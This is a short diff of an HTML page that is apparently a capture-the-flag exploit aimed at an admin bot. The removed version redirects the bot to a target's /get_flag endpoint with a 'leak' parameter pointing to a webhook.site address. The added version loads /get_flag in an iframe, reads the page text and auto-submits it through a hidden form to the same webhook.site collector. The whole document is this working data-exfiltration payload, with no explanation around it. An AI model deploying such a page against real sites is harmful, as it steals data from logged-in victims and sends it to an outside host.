@@ -1,9 +1,13 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <meta http-equiv="refresh" content="0; url=http://34.134.162.213:17001/get_flag?leak=https://webhook.site/f0455fd0-b8ef-49b3-ba00-a015762e26ad">
-  </head>
   <body>
-    <p>Redirecting admin...</p>
+    <form id="f" action="https://webhook.site/f0455fd0-b8ef-49b3-ba00-a015762e26ad" method="POST">
+      <input type="hidden" name="flag" value="">
+    </form>
+
+    <iframe name="loader" src="http://34.134.162.213:17001/get_flag" onload="
+      document.querySelector('input[name=flag]').value = this.contentDocument.body.innerText;
+      document.getElementById('f').submit();
+    "></iframe>
   </body>
 </html>
